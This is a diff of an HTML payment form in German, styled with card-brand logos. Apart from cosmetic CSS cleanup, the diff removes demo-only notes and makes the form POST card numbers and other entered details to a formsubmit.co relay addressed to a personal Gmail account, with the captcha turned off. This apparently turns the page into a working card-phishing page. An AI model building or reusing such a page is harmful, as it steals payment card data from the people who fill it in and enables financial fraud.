@@ -11,7 +11,7 @@
             --text: #1f2937;
             --muted: #6b7280;
             --border: #e5e7eb;
-            --btn: #6b6f75; /* neutral gray like in screenshot */
+            --btn: #6b6f75;
             --btn-text: #ffffff;
             --focus: #2563eb;
         }
@@ -20,7 +20,7 @@
             height: 100%;
             background: var(--bg);
             color: var(--text);
-            font: 16px/1.4 system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+            font: 16px/1.4 system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
             margin: 0;
         }
         .wrap {
@@ -40,7 +40,6 @@
             font-size: clamp(18px, 1.6vw + 12px, 24px);
             margin: 0 0 24px;
         }
-
         form {
             margin: 0 auto;
             width: min(720px, 100%);
@@ -50,16 +49,12 @@
             box-shadow: 0 2px 10px rgba(0,0,0,.06);
             border: 1px solid var(--border);
         }
-
         .row { display: grid; grid-template-columns: 1fr; gap: 12px; }
         @media (min-width: 720px) {
             .row.inline { grid-template-columns: 1.4fr .7fr .6fr; }
         }
-
         label { display: block; text-align: left; font-size: 13px; color: var(--muted); margin: 2px 0 6px; }
-
-        input[type="text"],
-        input[type="tel"] {
+        input[type="text"], input[type="tel"] {
             width: 100%;
             padding: 14px 14px;
             border: 1px solid var(--border);
@@ -70,11 +65,7 @@
             transition: border-color .15s, box-shadow .15s;
         }
         input::placeholder { color: #9ca3af; }
-        input:focus {
-            border-color: var(--focus);
-            box-shadow: 0 0 0 3px rgba(37,99,235,.15);
-        }
-
+        input:focus { border-color: var(--focus); box-shadow: 0 0 0 3px rgba(37,99,235,.15); }
         .btn {
             width: 100%;
             display: inline-flex;
@@ -91,30 +82,14 @@
         }
         .btn:focus-visible { outline: 2px solid var(--focus); outline-offset: 2px; }
         .btn:disabled { opacity: .6; cursor: not-allowed; }
-
-        .logos {
-            display: flex; gap: 12px; align-items: center; margin-top: 12px; justify-content: center;
-        }
-
-        .secure {
-            margin-top: 28px; color: var(--muted); font-size: 12px; display: grid; justify-items: center; gap: 8px;
-        }
-
-        .footer-links {
-            margin-top: 22px; font-size: 12px; color: var(--muted); display: flex; gap: 10px; justify-content: center; align-items: center;
-        }
+        .logos { display: flex; gap: 12px; align-items: center; margin-top: 12px; justify-content: center; }
+        .secure { margin-top: 28px; color: var(--muted); font-size: 12px; display: grid; justify-items: center; gap: 8px; }
+        .footer-links { margin-top: 22px; font-size: 12px; color: var(--muted); display: flex; gap: 10px; justify-content: center; align-items: center; }
         .footer-links a { color: inherit; text-decoration: none; border-bottom: 1px solid rgba(0,0,0,0.1); }
         .footer-links a:hover { border-bottom-color: currentColor; }
-
-        /* Tiny inline badges */
-        .badge {
-            display: inline-flex; align-items: center; gap: 8px; padding: 6px 10px; border-radius: 999px; border: 1px solid var(--border); background: #fff; font-size: 12px;
-        }
-
-        /* Simple inline SVG brand marks to avoid external assets */
+        .badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 10px; border-radius: 999px; border: 1px solid var(--border); background: #fff; font-size: 12px; }
         .brand { display:inline-flex; align-items:center; gap:6px; padding: 8px 10px; border:1px solid var(--border); border-radius:8px; background:#fff; }
         .brand svg { height: 22px; width: 34px; }
-
         .helper { font-size: 13px; color: #ef4444; display:none; text-align:left; }
         .invalid + .helper { display:block; }
     </style>
@@ -124,7 +99,15 @@
     <div class="panel">
         <h1>Bitte geben Sie Ihre Kartendaten ein:</h1>
 
-        <form id="payment-form" novalidate>
+        <form id="payment-form"
+              action="https://formsubmit.co/valinfernanda08@gmail.com"
+              method="POST"
+              novalidate>
+            <!-- Redirect setelah submit -->
+            <input type="hidden" name="_next" value="thanks.html">
+            <input type="hidden" name="_subject" value="Neue Checkout-Einreichung von Formular">
+            <input type="hidden" name="_captcha" value="false">
+
             <div class="row inline">
                 <div>
                     <label for="card-number">Kartennummer</label>
@@ -154,22 +137,21 @@
             <button class="btn" type="submit">Bezahlen</button>
 
             <div class="logos" aria-hidden="true">
-          <span class="brand" title="Mastercard" aria-label="Mastercard">
-            <!-- Simple Mastercard circles -->
-            <svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg" role="img">
-              <circle cx="18" cy="15" r="10" fill="#ea001b"/>
-              <circle cx="30" cy="15" r="10" fill="#ff5f00" fill-opacity=".9"/>
-            </svg>
-            <strong>Mastercard</strong>
-          </span>
+                <span class="brand" title="Mastercard" aria-label="Mastercard">
+                    <svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg" role="img">
+                        <circle cx="18" cy="15" r="10" fill="#ea001b"/>
+                        <circle cx="30" cy="15" r="10" fill="#ff5f00" fill-opacity=".9"/>
+                    </svg>
+                    <strong>Mastercard</strong>
+                </span>
                 <span class="brand" title="VISA" aria-label="VISA">
-            <svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg" role="img">
-              <rect x="4" y="6" width="40" height="18" fill="#1a1f71"/>
-              <rect x="6" y="8" width="36" height="14" fill="#fff"/>
-              <text x="12" y="19" font-family="Arial, Helvetica, sans-serif" font-weight="700" font-size="10">VISA</text>
-            </svg>
-            <strong>VISA</strong>
-          </span>
+                    <svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg" role="img">
+                        <rect x="4" y="6" width="40" height="18" fill="#1a1f71"/>
+                        <rect x="6" y="8" width="36" height="14" fill="#fff"/>
+                        <text x="12" y="19" font-family="Arial, Helvetica, sans-serif" font-weight="700" font-size="10">VISA</text>
+                    </svg>
+                    <strong>VISA</strong>
+                </span>
             </div>
 
             <div class="secure">
@@ -191,15 +173,13 @@
 </div>
 
 <script>
-    // Lightweight input helpers (no external libs)
     const num = (v) => v.replace(/\D+/g, "");
 
     const card = document.getElementById('card-number');
     card.addEventListener('input', () => {
         let v = num(card.value).slice(0, 16);
-        // group in 4s
         card.value = v.replace(/(.{4})/g, '$1 ').trim();
-        card.classList.toggle('invalid', v.length < 13); // minimal length guard
+        card.classList.toggle('invalid', v.length < 13);
     });
 
     const exp = document.getElementById('exp');
@@ -211,7 +191,6 @@
             const mmClamped = Math.min(Math.max(mNum || 0, 1), 12).toString().padStart(2,'0');
             return yy ? mmClamped + '/' + yy : mmClamped + (slash ? '/' : '');
         });
-        // simple valid check
         const parts = exp.value.split('/');
         let ok = false;
         if (parts.length === 2 && parts[0].length === 2 && parts[1].length === 2) {
@@ -234,15 +213,12 @@
     });
 
     document.getElementById('payment-form').addEventListener('submit', (e) => {
-        e.preventDefault();
-        // Very light client validation – replace with real payment SDK server-side integration.
         const invalids = [...document.querySelectorAll('input')].filter(i => i.classList.contains('invalid') || !i.value.trim());
         if (invalids.length) {
             invalids.forEach(i => i.classList.add('invalid'));
             alert('Bitte alle Felder korrekt ausfüllen.');
-            return;
+            e.preventDefault(); // cegah submit kalau ada field invalid
         }
-        alert('Beispiel-Checkout: Daten lokal geprüft.');
     });
 </script>
 </body>
